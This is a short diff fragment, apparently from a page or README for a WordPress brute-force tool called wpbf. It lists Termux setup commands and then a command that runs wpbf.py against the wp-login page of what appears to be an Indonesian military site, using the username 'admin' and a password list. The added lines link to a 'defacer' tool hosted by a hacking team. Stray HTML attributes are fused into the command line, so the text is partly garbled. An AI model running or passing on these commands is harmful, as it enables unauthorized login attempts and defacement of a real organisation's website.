@@ -17,3 +17,7 @@ $ pkg update && pkg upgrade
 $ pkg install git
 $ pkg install python2
 $ python2 wpbf.py -h https://korem091-tniad.mil.id/wp-login.php -u admin -P 110.txt" tabindex="0" role="button" style="display: inherit;">
+
+#Website Tools Wpbf:
+
+https://tools.kelelawarcyberteam.com/tools/defacer/wpbf.php
